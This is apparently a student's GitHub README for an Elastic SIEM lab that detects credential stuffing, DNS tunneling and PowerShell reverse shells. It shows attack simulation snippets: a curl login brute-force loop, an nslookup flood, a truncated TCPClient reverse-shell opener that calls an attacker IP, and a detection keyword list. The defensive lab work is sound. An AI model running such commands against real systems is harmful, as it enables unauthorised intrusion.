# Elastic SIEM — Threat Detection Lab

**Internship Project | SOC Analyst | March 2026**

A hands-on detection engineering project using the Elastic Stack to identify three real-world attack techniques in a self-built lab environment. Each scenario covers the full pipeline — from log ingestion and field parsing to detection rule creation, attack simulation, and live alert validation.

---

## 🔥 Highlights

- Built a full Elastic SIEM lab from scratch (Kibana, Fleet, Packetbeat, Elasticsearch)
- Designed 5 detection rules across 3 rule types — EQL Sequence, Threshold, and KQL Query
- Detected credential stuffing, DNS tunneling, and PowerShell exploitation
- Simulated all attacks using Kali Linux against a live Windows 11 target
- All 5 alerts confirmed firing in the Elastic Security dashboard
- Created a SOC analyst runbook covering triage, investigation queries, and containment

---

## 🛠️ Skills Used

`Elastic Stack` `Kibana` `Fleet` `Elastic Agent` `Packetbeat` `EQL` `Ingest Pipelines` `ECS Field Mapping` `Detection Engineering` `SIEM Configuration` `Log Parsing` `Windows Event Logs` `PowerShell Script Block Logging` `Kali Linux` `MITRE ATT&CK` `Threat Simulation` `Alert Validation`

---

## Lab Environment

| Component | Role |
|---|---|
| **Elastic Stack (Kibana + Elasticsearch)** | SIEM platform — log collection, parsing, detection rules, alerting |
| **Elastic Agent + Fleet** | Log ingestion and agent management |
| **Packetbeat** | Network-level packet capture for DNS traffic |
| **Windows 11 (XAMPP)** | Target host — hosted vulnerable PHP login app, generated auth logs |
| **Kali Linux** | Attacker machine — simulated credential stuffing, DNS tunneling, reverse shell |

---

## Detection Scenarios

### 1 — Credential Stuffing Detection

**Technique:** Attacker submits large volumes of username/password pairs (sourced from breached databases) against a login endpoint until one succeeds.

**Setup:**
- Hosted a vulnerable PHP login app on Windows via XAMPP
- Authentication attempts (pass/fail) logged to a flat `auth.log` file
- Custom Elastic ingest pipeline (`auth-log-parser`) built to parse log lines into ECS fields: `source.ip`, `user.name`, `event.outcome`
- Dissect pattern used: `%{auth.timestamp} | IP: %{source.ip} | USER: %{user.name} | STATUS: %{event.outcome}`

**Attack Simulation (Kali):**
```bash
# 20 failed attempts
for i in {1..20}; do
  curl -s -X POST http://172.30.80.1/lab/login.php \
    -d "username=admin&password=wrongpass" > /dev/null
done

# 1 successful login
curl -s -X POST http://172.30.80.1/lab/login.php \
  -d "username=admin&password=pass123" > /dev/null
```

**Detection Rules:**
| Rule | Type | Logic |
|---|---|---|
| Credential Stuffing — Failed Logins from Single IP | Threshold | ≥20 `event.outcome: failure` from same `source.ip` within 5 min |
| Credential Stuffing — Failure Followed by Successful Login | EQL Sequence | `failure` → `success` from same `source.ip` + `user.name` within 5 min |

**EQL Rule:**
```
sequence by source.ip, user.name with maxspan=5m
  [ any where event.outcome == "failure" ]
  [ any where event.outcome == "success" ]
```

**MITRE ATT&CK:** `TA0006 Credential Access` → `T1110 Brute Force`

**Alerts Generated:**
- Threshold rule → High severity, risk score 70 (triggered at 21:14:11)
- EQL correlation rule → High severity, risk score 80 (triggered at 21:40:38)

**Troubleshooting Note:** EQL rule initially failed to fire — traced to case sensitivity mismatch. Ingest pipeline normalised `event.outcome` to lowercase; original query used uppercase `"FAILURE"` / `"SUCCESS"`. Fixed by updating query values to lowercase.

---

### 2 — DNS Tunneling Detection

**Technique:** Attacker encodes data within DNS queries to communicate covertly with external systems. DNS traffic is typically allowed through firewalls without deep inspection, making it a common exfiltration and C2 channel.

**Setup:**
- Added Network Packet Capture integration in Fleet (Packetbeat)
- DNS monitoring enabled on port 53
- DNS events captured into `logs-network*` index with fields: `source.ip`, `dns.question.name`, `dns.response_code`

**Attack Simulation (Windows CMD):**
```cmd
for /L %i in (1,1,120) do nslookup data%i.testlab.com
```
Generated 120 sequential DNS queries for non-existent subdomains (`data1.testlab.com`, `data2.testlab.com`, ...) — all returning `NXDOMAIN`. High-frequency sequential subdomain queries are characteristic of DNS tunneling; successful resolution is not required.

**Detection Rule:**
| Field | Value |
|---|---|
| Rule Type | Threshold |
| Index | `logs-network*` |
| Query | `event.category:"network" AND dns.question.name:*` |
| Group By | `source.ip` |
| Threshold | ≥50 DNS queries within 5-minute window |
| Severity | High, risk score 73 |

**Alert Generated:** High severity alert at 21:51:09 from `192.168.1.2` — confirmed Packetbeat capture and threshold rule evaluation working correctly.

**Troubleshooting Note:** No DNS logs appeared initially — Packetbeat integration had not been enabled in Fleet. Enabling the Network Packet Capture integration and updating the agent policy resolved it.

---

### 3 — PowerShell Exploitation Detection

**Technique:** Attacker abuses PowerShell (a legitimate Windows administration tool) to establish reverse shells, download payloads, or execute encoded commands during post-exploitation.

**Setup:**
- Windows Event Logs collected via the Windows integration in Fleet
- PowerShell Script Block Logging (Event ID 4104) enabled — records full content of executed PowerShell commands
- Key fields available: `process.name`, `event.code`, `powershell.file.script_block_text`, `host.name`

**Attack Simulation (Windows PowerShell):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('172.30.89.150', 1234)
$stream = $client.GetStream()
# reverse shell payload
```

**Detection Rule:**
| Field | Value |
|---|---|
| Rule Type | Query |
| Index | `logs-windows*` |
| Query | Keywords: `Invoke-Expression`, `IEX`, `DownloadString`, `TCPClient`, `EncodedCommand`, `bypass`, `-nop` |
| Severity | High, risk score 70 |

**Alert Generated:** High severity alert at 22:17:57 on host `pavillion15` (user: Noel Biju John). Script block content captured the exact `TCPClient` command, confirming the detection logic identified the reverse shell attempt.

---

## Key Takeaways

- **Detection is not one-size-fits-all** — each attack required a different rule type (threshold, EQL sequence, keyword query) based on how it manifests in logs.
- **Data pipeline understanding is essential** — both troubleshooting issues (EQL case sensitivity, Packetbeat not enabled) required reasoning through the full ingestion-to-alert chain.
- **Behavioural detection > signature detection** — DNS tunneling rule detected based on query volume patterns, not known malicious domains. Effective even against new infrastructure.
- **Script Block Logging is high-value telemetry** — captures exact command content at execution time, enabling post-hoc forensic reconstruction and real-time detection.

---

## Repository Structure

```
elk-siem-threat-detection/
│
├── README.md                                      ← This file
├── architecture.md                                ← Lab topology, data flows, index patterns
├── soc_runbook.md                                 ← Analyst triage & response procedures
├── project_report.md                              ← Full project report (objectives, results, analysis)
├── LICENSE
├── .gitignore
│
├── rules/                                         ← Elastic-compatible detection rules (.ndjson)
│   ├── credential_stuffing_threshold.ndjson
│   ├── credential_stuffing_sequence.eql.ndjson
│   ├── dns_tunneling_volume_threshold.ndjson
│   ├── powershell_suspicious_args.ndjson
│   └── powershell_network_correlation.eql.ndjson
│
├── sample-logs/                                   ← Representative log events (ECS format)
│   ├── web-auth-logs-sample.json
│   ├── dns-logs-sample.json
│   └── powershell-logs-sample.json
│
└── ELK_Internship_Report.docx                    ← Full report with screenshots & alert evidence
```

> **Importing detection rules:** In Kibana → Security → Rules → Import rules → select any `.ndjson` file from `rules/`.

---

## Report

Full internship report with screenshots and alert evidence: [`ELK_Internship_Report.docx`](./ELK_Internship_Report.docx)
